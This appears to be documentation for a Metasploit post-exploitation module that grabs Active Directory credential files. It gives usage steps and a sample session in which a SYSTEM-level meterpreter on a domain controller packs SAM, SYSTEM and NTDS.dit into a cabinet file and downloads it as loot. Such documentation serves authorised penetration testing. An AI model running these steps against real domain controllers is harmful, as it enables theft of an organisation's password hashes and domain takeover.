## Creating A Testing Environment
  To use this module you need an meterpreter on a domain controller.
  The meterpreter has to have SYSTEM priviliges.
  Powershell has te be installed.

This module has been tested against:

  1. Windows Server 2008r2

This module was not tested against, but may work against:

  1. Other versions of Windows server.

## Verification Steps

  1. Start msfconsole
  2. Obtain a meterpreter session with a meterpreter via whatever method.
  3. Ensure the metepreter has SYSTEM priviliges.
  4. Ensure powershell is installed.
  3. Do: 'use post/windows/gather/ntds_grabber '
  4. Do: 'set session #'
  5. Do: 'run'

## Scenarios

### Windows Server 2008r2 with an x86 meterpreter

    msf exploit(psexec) > use post/windows/gather/ntds_grabber 
    msf post(ntds_grabber) > set session #
    session => #
    msf post(ntds_grabber) > run

    [+] [2017.04.05-12:26:49] Running as SYSTEM
    [+] [2017.04.05-12:26:50] Running on a domain controller
    [+] [2017.04.05-12:26:50] PowerShell is installed.
    [-] [2017.04.05-12:26:50] The meterpreter is not the same architecture as the OS! Migrating to process matching architecture!
    [*] [2017.04.05-12:26:50] Starting new x64 process C:\windows\sysnative\svchost.exe
    [+] [2017.04.05-12:26:51] Got pid 3088
    [*] [2017.04.05-12:26:51] Migrating..
    [+] [2017.04.05-12:26:56] Success!
    [*] [2017.04.05-12:26:56] Powershell Script executed
    [*] [2017.04.05-12:26:59] Creating All.cab
    [*] [2017.04.05-12:27:01] Waiting for All.cab
    [*] [2017.04.05-12:27:02] Waiting for All.cab
    [+] [2017.04.05-12:27:02] All.cab should be created in the current working directory
    [*] [2017.04.05-12:27:05] Downloading All.cab
    [+] [2017.04.05-12:27:15] All.cab saved in: /home/XXX/.msf4/loot/20170405122715_default_10.100.0.2_CabinetFile_648914.cab
    [*] [2017.04.05-12:27:15] Removing All.cab
    [+] [2017.04.05-12:27:15] All.cab Removed
    [*] Post module execution completed
    msf post(ntds_grabber) > loot

    Loot
    ====

    host        service  type          name     content          info                                              path
    ----        -------  ----          ----     -------          ----                                              ----
    10.100.0.2           Cabinet File  All.cab  application/cab  Cabinet file containing SAM, SYSTEM and NTDS.dit  /home/XXX/.msf4/loot/20170405122715_default_10.100.0.2_CabinetFile_648914.cab
